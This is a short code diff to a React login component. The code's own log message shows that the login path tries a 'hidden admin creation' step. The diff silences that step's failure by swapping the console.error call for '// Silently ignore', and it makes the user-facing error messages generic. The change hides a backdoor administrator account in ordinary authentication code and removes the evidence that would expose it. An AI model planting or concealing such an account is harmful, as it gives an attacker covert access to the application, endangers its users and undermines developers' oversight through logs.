@@ -45,7 +45,7 @@ const Login = () => {
                         return;
                     }
                 } catch (innerError) {
-                    console.error("Hidden admin creation failed", innerError);
+                    // Silently ignore
                 }
             }
 
@@ -54,7 +54,7 @@ const Login = () => {
             } else if (error.message.includes("Invalid email or password")) {
                 toast.error("Invalid email or password. Please try again.");
             } else {
-                toast.error(error.message || "Error logging in");
+                toast.error("Unable to sign in. Please verify your email and password.");
             }
         } finally {
             setLoading(false);
